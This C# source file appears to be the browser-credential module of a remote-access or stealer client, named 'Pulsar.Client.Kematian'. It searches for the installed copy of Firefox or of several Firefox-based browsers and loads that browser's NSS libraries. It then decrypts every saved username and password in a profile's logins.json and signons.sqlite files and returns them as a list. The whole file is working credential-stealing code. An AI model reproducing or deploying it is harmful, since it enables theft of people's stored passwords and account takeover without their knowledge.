using Pulsar.Client.Helper;
using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using Pulsar.Client.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;

namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
{
    public class PasswordsGecko : IDisposable
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;

        public bool Init(string profilePath, string loginData = "", string signons = "")
        {
            try
            {

                if (!string.IsNullOrEmpty(loginData) && !File.Exists(loginData))
                {
                    Debug.WriteLine($"Error: logins.json not found at {loginData}");
                    return false;
                }

                string[] possibleBrowserPaths = {
                    // Firefox
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Mozilla Firefox\"),
                    
                    // LibreWolf
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"LibreWolf\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"LibreWolf\"),
                    
                    // Zen
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Zen Browser\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Zen Browser\"),
                    
                    // Waterfox
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Waterfox\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Waterfox\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Waterfox Classic\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Waterfox Classic\"),
                    
                    // Pale Moon
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Pale Moon\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Pale Moon\"),
                    
                    // Sea Monkey
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"SeaMonkey\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"SeaMonkey\")
                };
                
                bool libsFound = false;
                string browserDir = "";
                
                foreach (var path in possibleBrowserPaths)
                {
                    if (Directory.Exists(path))
                    {
                        string nss = Path.Combine(path, "nss3.dll");
                        string mozglue = Path.Combine(path, "mozglue.dll");
                        
                        if (File.Exists(nss) && File.Exists(mozglue))
                        {
                            libsFound = true;
                            browserDir = path;
                            break;
                        }
                    }
                }
                
                if (!libsFound)
                {
                    string currentDir = profilePath;
                    
                    for (int i = 0; i < 5; i++)
                    {
                        string nss = Path.Combine(currentDir, "nss3.dll");
                        string mozglue = Path.Combine(currentDir, "mozglue.dll");
                        
                        if (File.Exists(nss) && File.Exists(mozglue))
                        {
                            libsFound = true;
                            browserDir = currentDir;
                            break;
                        }
                        
                        DirectoryInfo parentDir = Directory.GetParent(currentDir);
                        if (parentDir == null) break;
                        currentDir = parentDir.FullName;
                    }
                }
                
                if (libsFound)
                {
                    if (Path.GetDirectoryName(profilePath) != browserDir)
                    {

                    }
                    
                    try
                    {
                        NSS nss = new NSS();
                        if (nss.Initialize(profilePath, browserDir))
                        {
                            NSS3 = nss.NSS3;
                            Mozglue = nss.Mozglue;
                            PK11SDR_Decrypt = nss.PK11SDR_Decrypt;
                            NSS_Shutdown = nss.NSS_Shutdown;
                            
                            Debug.WriteLine("NSS initialized successfully");
                            return true;
                        }
                        else
                        {
                            Debug.WriteLine("NSS initialization failed");
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error initializing NSS: {ex.Message}");
                    }
                }
                else
                {
                    Debug.WriteLine("Failed to find NSS libraries in any location");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in PasswordsGecko Init: {ex.Message}");
            }
            return false;
        }

        public string Decrypt(string cypherText)
        {
            if (string.IsNullOrEmpty(cypherText))
                return string.Empty;

            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem
                {
                    SECItemType = 0,
                    SECItemData = ffDataUnmanagedPointer,
                    SECItemLen = ffData.Length
                };

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.UTF8.GetString(bvRet);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Decryption error: {ex.Message}");
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        public IEnumerable<string> SafeEnumerateDirectories(string path)
        {
            var directories = new List<string>();
            try
            {
                foreach (var dir in Directory.EnumerateDirectories(path))
                {
                    directories.Add(dir);

                    // Recursively enumerate subdirectories
                    try
                    {
                        directories.AddRange(SafeEnumerateDirectories(dir));
                    }
                    catch (UnauthorizedAccessException)
                    {
                        //Debug.WriteLine("Unauthorized access to directory: " + dir);
                    }
                    catch (PathTooLongException)
                    {
                        // Skip directories with paths that are too long
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                //Debug.WriteLine(path);
            }
            catch (PathTooLongException)
            {
                // Skip root-level directories with paths that are too long
            }
            return directories;
        }

        public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signonsDBPath = "")
        {
            var logins = new List<LoginData>();
            Debug.WriteLine($"Profile path: {profilePath}");
            Debug.WriteLine($"Logins.json path: {loginJsonPath}");
            Debug.WriteLine($"Signons.sqlite path: {signonsDBPath}");

            // Check if at least one file exists
            bool loginsJsonExists = !string.IsNullOrEmpty(loginJsonPath) && File.Exists(loginJsonPath);
            bool signonsExists = !string.IsNullOrEmpty(signonsDBPath) && File.Exists(signonsDBPath);

            if (!loginsJsonExists && !signonsExists)
            {
                Debug.WriteLine("No login files found.");
                return logins;
            }

            if (!Init(profilePath))
            {
                Debug.WriteLine("Failed to initialize NSS.");
                return logins;
            }

            // Process logins.json if it exists
            if (loginsJsonExists)
            {
                try
                {
                    FFLogins ffLoginData;
                    using (var sr = File.OpenRead(loginJsonPath))
                    {
                        ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                    }

                    foreach (Login loginData in ffLoginData.Logins)
                    {
                        try
                        {
                            string username = Decrypt(loginData.EncryptedUsername);
                            string password = Decrypt(loginData.EncryptedPassword);
                            string url = loginData.Hostname?.ToString() ?? string.Empty;

                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
                            {
                                logins.Add(new LoginData(url, username, password));
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing login entry: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing logins.json: {ex.Message}");
                }
            }

            // Process signons.sqlite if it exists
            if (signonsExists)
            {
                try
                {
                    SQLiteHandler sqlDatabase = new SQLiteHandler(signonsDBPath);

                    if (sqlDatabase.ReadTable("moz_logins"))
                    {
                        for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                        {
                            try
                            {
                                string host = sqlDatabase.GetValue(i, "hostname");
                                string encryptedUser = sqlDatabase.GetValue(i, "encryptedUsername");
                                string encryptedPass = sqlDatabase.GetValue(i, "encryptedPassword");

                                string username = Decrypt(encryptedUser);
                                string password = Decrypt(encryptedPass);

                                if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                                {
                                    logins.Add(new LoginData(host, username, password));
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing signons entry: {ex.Message}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing signons.sqlite: {ex.Message}");
                }
            }

            return logins;
        }

        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBAByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class DismissedBAByLoginGuid
        {
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    if (NSS_Shutdown != null)
                        NSS_Shutdown();

                    if (NSS3 != IntPtr.Zero)
                        NativeMethods.FreeLibrary(NSS3);

                    if (Mozglue != IntPtr.Zero)
                        NativeMethods.FreeLibrary(Mozglue);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error during disposal: {ex.Message}");
                }
            }
        }
        private class NSS
        {
            public IntPtr NSS3 { get; private set; }
            public IntPtr Mozglue { get; private set; }
            public NssInit NSS_Init { get; private set; }
            public Pk11sdrDecrypt PK11SDR_Decrypt { get; private set; }
            public NssShutdown NSS_Shutdown { get; private set; }
            
            public bool Initialize(string profilePath, string browserPath)
            {
                try
                {
                    string nss = Path.Combine(browserPath, "nss3.dll");
                    string mozglue = Path.Combine(browserPath, "mozglue.dll");
                    
                    Mozglue = NativeMethods.LoadLibrary(mozglue);
                    NSS3 = NativeMethods.LoadLibrary(nss);
                    
                    if (NSS3 == IntPtr.Zero || Mozglue == IntPtr.Zero)
                    {
                        return false;
                    }
                    
                    IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
                    IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
                    IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
                    
                    if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
                    {
                        return false;
                    }
                    
                    NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
                    PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
                    NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
                    
                    int result = (int)NSS_Init(profilePath);
                    if (result != 0)
                    {
                        return false;
                    }
                    
                    return true;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error initializing NSS: {ex.Message}");
                    return false;
                }
            }
        }
    }
}
